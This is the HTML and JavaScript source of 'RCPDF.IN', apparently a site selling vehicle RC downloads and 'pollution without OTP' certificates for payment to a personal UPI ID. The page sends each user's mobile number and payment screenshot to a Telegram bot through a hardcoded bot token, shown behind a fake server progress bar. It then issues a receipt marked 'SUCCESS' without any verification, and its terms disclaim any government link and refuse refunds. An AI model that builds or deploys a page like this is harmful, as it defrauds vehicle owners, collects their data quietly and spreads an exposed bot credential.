<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RCPDF.IN - Digital Services</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        :root { --primary: #ff0066; --ind-blue: #003399; --yellow: #ffdb58; }
        * { margin:0; padding:0; box-sizing:border-box; font-family: 'Arial', sans-serif; }
        
        body { 
            background: linear-gradient(180deg, #FF9933 0%, #ffffff 40%, #ffffff 60%, #138808 100%);
            background-attachment: fixed; color: #000; overflow-x: hidden; min-height: 100vh;
        }

        /* UI Elements */
        .header { position: fixed; top: 0; width: 100%; background: #fff; padding: 12px 20px; display: flex; justify-content: space-between; align-items: center; z-index: 1000; height: 60px; border-bottom: 3px solid var(--ind-blue); }
        .menu-btn { cursor: pointer; display: flex; flex-direction: column; gap: 4px; width: 28px; }
        .menu-btn div { width: 100%; height: 3px; background: var(--ind-blue); border-radius: 2px; }
        .logo { color: var(--ind-blue); font-weight: 900; font-size: 22px; text-decoration: none; position: absolute; left: 50%; transform: translateX(-50%); }

        .sidebar { position: fixed; top: 0; left: -280px; width: 260px; height: 100%; background: #fff; transition: 0.4s; z-index: 2000; padding: 80px 20px; box-shadow: 5px 0 15px rgba(0,0,0,0.2); }
        .sidebar.active { left: 0; }
        .s-link { display: block; width: 100%; padding: 14px; margin-bottom: 12px; background: #f8f9fa; border-radius: 8px; text-decoration: none; color: #333; font-weight: bold; border: 1px solid #ddd; cursor:pointer; }

        .card { margin: 100px auto 20px; width: 92%; max-width: 450px; background: rgba(255, 255, 255, 0.98); padding: 30px 20px; border-radius: 25px; text-align: center; border: 2px solid var(--ind-blue); box-shadow: 0 10px 25px rgba(0,0,0,0.2); }

        .hsrp-plate { background: #fff; width: 100%; height: 75px; border: 2px solid #000; border-radius: 12px; display: flex; align-items: center; overflow: hidden; margin-bottom: 15px; position: relative; }
        .ind-strip { background: var(--ind-blue); width: 55px; height: 100%; display: flex; flex-direction: column; align-items: center; justify-content: center; color: #fff; z-index: 2; position: absolute; left: 0; }
        .ind-strip img { width: 25px; margin-bottom: 2px; }
        
        input[type="text"], input[type="tel"] { width: 100%; padding: 15px; border-radius: 12px; border: 2px solid #ddd; margin-bottom: 15px; font-size: 18px; text-align: center; font-weight: bold; outline: none; }
        #vehInput { border: none; font-size: 24px; padding-left: 65px; margin-bottom: 0; }

        /* Vehicle Selector */
        .v-selector { display: flex; gap: 10px; justify-content: center; margin-bottom: 20px; }
        .v-btn { flex: 1; padding: 10px; border: 2px solid #ddd; border-radius: 10px; cursor: pointer; background: #fff; font-weight: bold; transition: 0.3s; }
        .v-btn.active { background: var(--yellow); border-color: #f1c40f; }

        /* Buttons */
        .btn { width: 100%; padding: 16px; border-radius: 12px; border: none; background: var(--ind-blue); color: #fff; font-size: 16px; font-weight: bold; cursor: pointer; margin-bottom: 10px; }
        .btn-row { display: flex; gap: 10px; }
        .btn-challan { background: #e67e22; flex: 1; font-size: 12px; }
        .btn-poll { background: #27ae60; flex: 1; font-size: 12px; }

        /* Neon & Loader */
        .neon-box { position: relative; padding: 4px; border-radius: 15px; background: #000; overflow: hidden; margin-bottom: 15px; }
        .neon-box::before { content: ''; position: absolute; top: -50%; left: -50%; width: 200%; height: 200%; background: conic-gradient(#ff0000, #ff7300, #fffb00, #48ff00, #00ffd5, #002bff, #7a00ff, #ff00c8, #ff0000); animation: rotateRGB 3s linear infinite; }
        .inner-box { position: relative; background: #fff; border-radius: 11px; padding: 10px; z-index: 1; }
        @keyframes rotateRGB { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }

        .loader-wrap { position: fixed; inset: 0; background: #000; z-index: 5000; display: none; flex-direction: column; justify-content: center; align-items: center; color: #fff; }
        .road { width: 80%; height: 4px; background: #333; position: relative; }
        .car-load { font-size: 40px; position: absolute; bottom: 0; left: 0; transform: scaleX(-1); }

        .footer { background: #fff; padding: 25px; border-top: 3px solid var(--ind-blue); text-align: center; margin-top: 30px; }
    </style>
</head>
<body>

    <div class="header">
        <div class="menu-btn" onclick="toggleM()"><div></div><div></div><div></div></div>
        <b class="logo">RCPDF.IN</b>
        <button style="background:none; border:none; font-size:24px;" onclick="location.reload()">🏠</button>
    </div>

    <div class="sidebar" id="side">
        <button class="s-link" onclick="window.location.href='https://insurancebju.blogspot.com/2025/11/blog-post_17.html?m=1'">Insurance Services</button>
        <button class="s-link" onclick="location.reload()">RC Download</button>
        <button class="s-link" onclick="toggleM()" style="background:#ffdddd;">Close</button>
    </div>

    <div class="card" id="mainPage">
        <div id="step1">
            <h2 style="margin-bottom:15px; color: var(--ind-blue);">Download Digital RC</h2>
            <div class="hsrp-plate">
                <div class="ind-strip"><img src="https://upload.wikimedia.org/wikipedia/commons/4/41/Flag_of_India.svg"><span>IND</span></div>
                <input type="text" id="vehInput" placeholder="BR-09-AB-1234" maxlength="13" oninput="formatV(this)">
            </div>
            <button class="btn" onclick="showPay('RC', 120)">CONTINUE</button>
            <div class="btn-row">
                <button class="btn btn-challan" onclick="window.location.href='https://echallan.parivahan.gov.in/index/accused-challan#challan_list'">PAY CHALLAN ONLINE</button>
                <button class="btn btn-poll" onclick="openPollution()">POLLUTION WITHOUT OTP</button>
            </div>
        </div>
    </div>

    <div class="card" id="pollPage" style="display:none;">
        <h2 style="color:#27ae60; margin-bottom:5px;">POLLUTION WITHOUT OTP</h2>
        <p style="font-size:12px; margin-bottom:15px; font-weight:bold;">ENTER YOUR VEHICLE NUMBER</p>
        <input type="text" id="pollVeh" placeholder="GJ-01-XX-0000" oninput="this.value=this.value.toUpperCase()">
        
        <div class="v-selector">
            <button class="v-btn" onclick="setV(this, 'CAR')">🚗 CAR</button>
            <button class="v-btn" onclick="setV(this, 'BIKE')">🏍️ BIKE</button>
            <button class="v-btn" onclick="setV(this, 'TRUCK')">🚛 TRUCK</button>
        </div>
        <button class="btn" style="background:#27ae60;" onclick="showPay('POLLUTION', 125)">PROCEED TO PAY ₹125</button>
        <button class="btn" style="background:#888;" onclick="location.reload()">GO BACK</button>
    </div>

    <div class="card" id="paySection" style="display:none;">
        <h3 id="payTitle">Payment</h3>
        <div style="background:#fff; padding:10px; border-radius:15px; display:inline-block; margin:15px 0; border:1px solid #ddd;">
            <img id="qr" src="" width="160">
            <p id="amtText" style="font-size:14px; font-weight:bold; margin-top:5px;"></p>
        </div>
        <input type="tel" id="mob" placeholder="WhatsApp Number" maxlength="10">
        <div class="neon-box">
            <div class="inner-box">
                <input type="file" id="ss" accept="image/*" style="width:100%;">
                <p style="font-size:11px; margin-top:5px; color:#555; font-weight:bold;">UPLOAD PAYMENT SCREENSHOT</p>
            </div>
        </div>
        <button class="btn" onclick="finalSubmit()">VERIFY & DOWNLOAD</button>
    </div>

    <div class="footer">
        <div class="footer-links">
            <span onclick="alert('Safe')">Privacy</span> | <span onclick="alert('T&C')">Terms</span> | <span onclick="alert('No Refund')">Refund</span>
        </div>
        <p style="font-size: 12px; margin-top:10px;">© 2026 RCPDF.IN | Original Digital Services</p>
    </div>

    <div class="loader-wrap" id="load">
        <div class="road"><div class="car-load" id="carIcon">🚗</div></div>
        <div class="pct" id="pText">0%</div>
        <p>🔄 Connecting to Server...</p>
    </div>

    <script>
        let currentType = ""; 
        let currentAmt = 0;
        let selectedVehicle = "";

        function toggleM() { document.getElementById('side').classList.toggle('active'); }
        function openPollution() { 
            document.getElementById('mainPage').style.display='none'; 
            document.getElementById('pollPage').style.display='block'; 
        }
        function setV(btn, type) {
            document.querySelectorAll('.v-btn').forEach(b => b.classList.remove('active'));
            btn.classList.add('active');
            selectedVehicle = type;
        }

        function formatV(i) {
            let v = i.value.toUpperCase().replace(/[^A-Z0-9]/g, '');
            let out = "";
            if (v.length > 0) out += v.substring(0, 2);
            if (v.length > 2) out += "-" + v.substring(2, 4);
            if (v.length > 4) out += "-" + v.substring(4, 6);
            if (v.length > 6) out += "-" + v.substring(6, 10);
            i.value = out;
        }

        function showPay(type, amt) {
            let vNo = (type === 'RC') ? document.getElementById('vehInput').value : document.getElementById('pollVeh').value;
            if(vNo.length < 8) { alert("Enter proper Vehicle Number!"); return; }
            if(type === 'POLLUTION' && !selectedVehicle) { alert("Select Vehicle Type (Car/Bike/Truck)!"); return; }
            
            currentType = type; currentAmt = amt;
            const upi = `upi://pay?pa=8709610091@okbizaxis&pn=RCPDF&am=${amt}.00&cu=INR&tn=${type}`;
            document.getElementById('qr').src = "https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=" + encodeURIComponent(upi);
            document.getElementById('amtText').innerText = "SCAN & PAY ₹" + amt;
            document.getElementById('payTitle').innerText = type + " PAYMENT";
            
            document.getElementById('mainPage').style.display='none';
            document.getElementById('pollPage').style.display='none';
            document.getElementById('paySection').style.display='block';
        }

        async function finalSubmit() {
            const m = document.getElementById('mob').value;
            const s = document.getElementById('ss').files[0];
            if(m.length < 10 || !s) { alert("Mobile number and Screenshot are required!"); return; }

            document.getElementById('load').style.display='flex';
            let p = 0;
            let iv = setInterval(async () => {
                p += 2; document.getElementById('pText').innerText = p + "%";
                document.getElementById('carIcon').style.left = (p * 0.8) + "%";
                
                if (p === 60) {
                    const txId = "TXN" + Math.floor(Math.random() * 9000000000);
                    const vNo = (currentType === 'RC') ? document.getElementById('vehInput').value : document.getElementById('pollVeh').value;
                    
                    // TELEGRAM NOTIFICATION (OLD FORMAT)
                    let fd = new FormData();
                    fd.append("chat_id", "5600045707");
                    fd.append("photo", s);
                    fd.append("caption", `🚀 *NEW ORDER RECEIVED*\n\n📝 *Type:* ${currentType}\n🆔 *Txn ID:* \`${txId}\`\n🚗 *Vehicle No:* ${vNo}\n📱 *Mobile:* ${m}\n💰 *Amount:* ₹${currentAmt}\n👑 *Vehicle Type:* ${selectedVehicle || 'N/A'}\n\n✅ *Status:* Payment Pending Verification`);
                    fd.append("parse_mode", "Markdown");
                    fetch(`https://api.telegram.org/bot8138238341:AAGi4LxV7247hUvs_HoGLSKRhkcEapMCSuA/sendPhoto`, {method:"POST", body:fd});
                    
                    generatePDF(txId, vNo, m);
                }
                if (p >= 100) { clearInterval(iv); location.reload(); }
            }, 80);
        }

        function generatePDF(tx, v, m) {
            const { jsPDF } = window.jspdf;
            const doc = new jsPDF();
            
            doc.setFillColor(0, 51, 153); doc.rect(5, 5, 200, 35, 'F');
            doc.setTextColor(255); doc.setFontSize(22); doc.setFont("helvetica", "bold");
            doc.text(currentType + " RECEIPT", 105, 25, null, null, "center");
            
            doc.setTextColor(0); doc.setFontSize(12);
            let y = 55;
            const details = [
                ["RECEIPT NO:", tx], ["VEHICLE NO:", v], ["MOBILE NO:", m], 
                ["SERVICE TYPE:", currentType], ["AMOUNT PAID:", "INR " + currentAmt], ["STATUS:", "SUCCESS"]
            ];
            details.forEach(row => {
                doc.setDrawColor(200); doc.rect(15, y, 180, 10);
                doc.text(row[0], 20, y + 7); doc.text(row[1], 80, y + 7);
                y += 10;
            });

            // REAR PLATE ICON
            doc.setDrawColor(0); doc.rect(15, y + 10, 80, 20);
            doc.setFontSize(10); doc.text("REAR NUMBER PLATE PHOTO", 20, y + 18);
            doc.setFontSize(25); doc.text("🚗", 100, y + 25);

            y += 50;
            doc.setFontSize(13); doc.text("TERMS AND CONDITIONS", 15, y);
            doc.setFontSize(8); doc.setTextColor(100);
            const terms = [
                "1. RCPDF.IN ka RTO ya kisi sarkari vibhag se koi sambandh nahi hai.",
                "2. Ye website sirf digital information aur educational use ke liye hai.",
                "3. Amount kisi bhi haal mein Refund nahi kiya jayega.",
                "4. Galat gaadi number ya jankari ki puri jimmedari USER ki hogi.",
                "5. Website kisi bhi tarah ke jurmane ya legal issue ke liye zimmedar nahi hai.",
                "6. Original copy WhatsApp par 30-60 minute mein bhej di jayegi.",
                "7. Dispute hone par legal action website ke jurisdiction mein hoga."
            ];
            doc.text(terms, 15, y + 8);

            // BADA THANK YOU
            doc.setDrawColor(0, 51, 153); doc.rect(5, 5, 200, 287);
            doc.setTextColor(0, 51, 153); doc.setFont("times", "italic"); doc.setFontSize(45);
            doc.text("Thank You", 105, 275, null, null, "center");

            doc.save(currentType + "_Receipt.pdf");
        }
    </script>
</body>
</html>
